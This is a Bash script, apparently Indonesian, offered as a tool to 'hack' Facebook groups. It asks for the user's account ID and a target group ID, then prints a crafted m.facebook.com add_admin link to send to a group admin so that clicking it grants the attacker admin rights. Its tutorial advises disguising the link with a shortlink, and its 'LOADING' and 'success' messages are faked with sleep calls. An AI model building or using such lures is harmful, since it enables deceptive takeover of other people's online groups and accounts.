#please dont recode this program
#sengaja tidak di enkrip untuk pembelajaran :) Have Fun!
#LUCKYARD@chg.official

blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'

clear
cowsay -f eyes "CyXNot404" | lolcat
echo "    ________  ___  __       __      _ __"
echo "   / ____/ / / / |/ /____  / /___  (_) /_" | lolcat
echo "  / /_  / /_/ /|   // __ \/ / __ \/ / __"/
echo " / __/ / __  //   |/ /_/ / / /_/ / / /_" | lolcat
echo "/_/   /_/ /_//_/|_/ .___/_/\____/_/\__/"
echo "                 /_/v1.0;Author By CyXNot404" | lolcat
echo
echo $cyan"========================================================"
echo $green"	   Folow me On Youtube  : Ethical Dark ID"
echo $green"	   Folow me On Facebook : lucky ardhika"
echo $cyan"========================================================"
echo
echo $blue"Chose The Language | Pilih Bahasa Anda"
echo $red"[ " $yellow"1 " $red"]" $white"BAHASA INDONESIA"
echo $red"[ " $yellow"2 " $red"]" $white"INGLISH LANGUAGE"
echo $purple
read -p "No : " l

if [ $l = 1 ]
then
echo $cyan"Optional :*"
echo
echo $red"[ " $yellow"A " $red"]" $white"Tutorial Cara Pakai Tools"
echo $red"[ " $yellow"B " $red"]" $white"Hack Grup Sekarang!"
echo $purple
read -p "No : " t
  if [ $t = A ]
  then
  figlet -f slant "WARNING!"
  echo $cyan"•===============================================>"
  echo "Cara Hack Grup Facebook!"
  echo "Untuk Menjalankan Script ini Pilih Opsional B"
  echo "Script ini Menggunakan link Facebook,"
  echo "Hal Yang Kamu Butuhkan Adalah Sbb :"
  echo "1) Admin Grup"
  echo "2) Id Akun Kamu (didapat melalui browser pada link fb)"
  echo "3) Id Grup Yang Akan di hack (di dpt melalui browser pada link fb)"
  echo "4) Shortlink (saran)"
  echo "5) Facebook"
  echo "6) Kuota"
  echo "7) Hp/Pc"
  echo "8) Ide Dan Akal Sangat Berpengaruh,knp? Pikir sendiri lah Cuk!"
  echo "9) Dll"
  echo "Kirim The Direct link Ke Target saran saya pake shortlink custom"
  echo "Segala TanggunJawab Dan Risiko Merupakan Hak Anda!" 
  echo "Gunakan Dengan Bijak Agar Tidak Kena Azab :v"
  echo "Tools Ini Hanya Untuk Newbee but No Mastah"
  read -p "ENTER UNTUK KEMBALI KE MENU" v
  sh fb.sh
  fi
  if [ $t = B ]
  then
  echo "    ________  ___  __       __      _ __"
  echo "   / ____/ / / / |/ /____  / /___  (_) /_" | lolcat
  echo "  / /_  / /_/ /|   // __ \/ / __ \/ / __"/
  echo " / __/ / __  //   |/ /_/ / / /_/ / / /_" | lolcat
  echo "/_/   /_/ /_//_/|_/ .___/_/\____/_/\__/"
  echo "                 /_/v1.0;Author By CyXNot404" | lolcat
  echo $cyan
  read -p "Id Akun Kamu   : " a
  read -p "Id Grup Target : " g
  echo $yellow
  echo "ID Kamu : $a;ID Grup : $g;"
  read -p "Apakah Anda Yakin Lanjut(y/n)" d
    if [ $d = y ] || [ $d = Y ]
    then
    echo
    echo $green"Tindakan Di Konfirmasi!"
    sleep 0.5
    echo
    echo "[ LOADING... ]"
    sleep 3
    echo "[ Succes Create The Link! Enter To View Link ]"
    read c
    echo
    echo "send The Link To Target :"
    echo $cyan"https://m.facebook.com/group/add_admin/?group_id=​$g&user_id=​$a&added&_rdrChange"
    echo
    echo
    echo $white"THANKS FOR USING MY TOOLS :)"
    fi
    if [ $d = n ] || [ $d = N ]
    then
    echo $red"Proses Di Batalkan!"
    fi
  fi
fi
if [ $l = 2 ]
then
echo
echo
echo
echo
figlet  "Coming" | lolcat
figlet  "Soon!" | lolcat
else
   echo $red
   echo "Noting Optional $l"
   echo "Relogin The Program..."
   sleep 3
   sh fb.sh
fi
